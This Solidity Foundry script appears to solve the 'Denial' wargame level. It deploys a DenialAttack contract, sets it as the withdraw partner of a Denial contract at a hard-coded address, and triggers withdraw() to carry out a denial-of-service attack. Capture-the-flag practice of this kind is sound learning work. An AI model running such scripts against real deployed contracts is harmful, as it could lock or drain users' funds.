// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {DenialAttack} from "../src/Denial/DenialAttack.sol";
import {Denial} from "../src/Denial/Denial.sol";

contract DenialScript is Script {
    // Denial public denial;
    Denial public denial = Denial(payable(0x70897deEa0325308ddD41f6e1947C56BD64087Ae)); 
    DenialAttack public denialAttack;

    function run() public {
        vm.startBroadcast();
        // denial = new Denial();
        denialAttack = new DenialAttack();
        denial.setWithdrawPartner(address(denialAttack));
        denial.withdraw();
        vm.stopBroadcast();
    }

}
